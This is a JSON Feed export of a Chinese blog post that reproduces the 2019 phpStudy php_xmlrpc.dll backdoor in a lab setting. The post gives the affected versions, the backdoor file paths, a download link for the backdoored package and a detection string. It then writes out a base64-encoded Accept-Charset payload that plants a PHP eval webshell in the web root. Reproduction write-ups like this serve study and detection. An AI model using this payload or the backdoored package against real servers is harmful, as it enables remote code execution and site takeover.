{
    "version": "https://jsonfeed.org/version/1",
    "title": "Pikachu • All posts by \"web\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/07/21/phpstudy%E5%90%8E%E9%97%A8/",
            "url": "http://example.com/2022/07/21/phpstudy%E5%90%8E%E9%97%A8/",
            "title": "phpstudy后门漏洞复现",
            "date_published": "2022-07-21T02:42:55.000Z",
            "content_html": "<h2 id=\"漏洞介绍\"><a class=\"markdownIt-Anchor\" href=\"#漏洞介绍\">#</a> 漏洞介绍</h2>\n<p>2019 年 9 月 20，网上传出 phpstudy 软件存在后门，随后作者立即发布生命进行澄清，其真实情况是该软件官网在 2016 年被非法入侵，程序包自带 PHP 的 php_xmlrpc.dll 模块被植入隐藏后门，可以正向执行任意 php 代码。</p>\n<p>影响版本：<br>\nphpStudy2016-php-5.2.17<br>\nphpStudy2016-php-5.4.45<br>\nphpStudy2018-php-5.2.17<br>\nphpStudy2018-php-5.4.45</p>\n<h2 id=\"环境安装\"><a class=\"markdownIt-Anchor\" href=\"#环境安装\">#</a> 环境安装</h2>\n<p>本次环境复现我们拿 phpStudy-2018 搭建</p>\n<ul>\n<li>phpstudy-2018 后门版：<a href=\"https://pan.baidu.com/s/1s55fGSRt9N6zYpFCU8hxyw\">https://pan.baidu.com/s/1s55fGSRt9N6zYpFCU8hxyw</a> 提取码:y9cg</li>\n</ul>\n<p>这个和正常的安装一样，只不过启动环境的时候，开启非服务模式</p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png\" alt=\"image-20220721114142496\"></p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png\" alt=\"image-20220721114235376\"></p>\n<h2 id=\"漏洞的检测\"><a class=\"markdownIt-Anchor\" href=\"#漏洞的检测\">#</a> 漏洞的检测</h2>\n<p>如果 phpstduy 存在后门会在一下路径文件中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># phpStudy2016路径</span><br><span class=\"line\">php\\php-5.2.17\\ext\\php_xmlrpc.dll</span><br><span class=\"line\">php\\php-5.4.45\\ext\\php_xmlrpc.dll</span><br><span class=\"line\"></span><br><span class=\"line\"># phpStudy2018路径</span><br><span class=\"line\">PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc.dll</span><br><span class=\"line\">PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll</span><br></pre></td></tr></table></figure>\n<p>如果 PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 文件存在 @eval (% s (’% s’)); 说明存在后门</p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png\" alt=\"image-20220721123100966\"></p>\n<h2 id=\"漏洞复现\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现\">#</a> 漏洞复现</h2>\n<p>我们使用 burpsite 工具抓包后把 accept-charset 添加到请求头里面去，在这个 accept-charset 后面添加需要执行的命令，但是需要进行 base64 编码<br>\n ** 注意：** 要把 gzip,deflate 中间逗号后面的空格去掉不然无法执行命令。<br>\n<img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png\" alt=\"image-20220721145301213\"></p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png\" alt=\"image-20220721145409916\"></p>\n<p>这里我们可以利用这个写入 webshell，我们先需要知道绝对路径，这里我们可以访问 phpinfo 文件<br>\n<img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png\" alt=\"image-20220721145715603\"></p>\n<p>这里我们知道绝对路径后就可以利用 phpstudy 后门漏洞写木马。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fputs(fopen(&#x27;C:/phpStudy/PHPTutorial/WWW/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;)</span><br><span class=\"line\">bas64编码后</span><br><span class=\"line\">ZnB1dHMoZm9wZW4oJ0M6L3BocFN0dWR5L1BIUFR1dG9yaWFsL1dXVy9zaGVsbC5waHAnLCd3JyksJzw/cGhwIEBldmFsKCRfUE9TVFsxMjNdKTs/PicpOw==</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png\" alt=\"image-20220721150315393\"></p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png\" alt=\"image-20220721150328779\"></p>\n<p>用 webshell 工具连接成功</p>\n<p><img src=\"https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png\" alt=\"image-20220721150357659\"></p>\n",
            "tags": [
                "phpstudy后门漏洞复现"
            ]
        }
    ]
}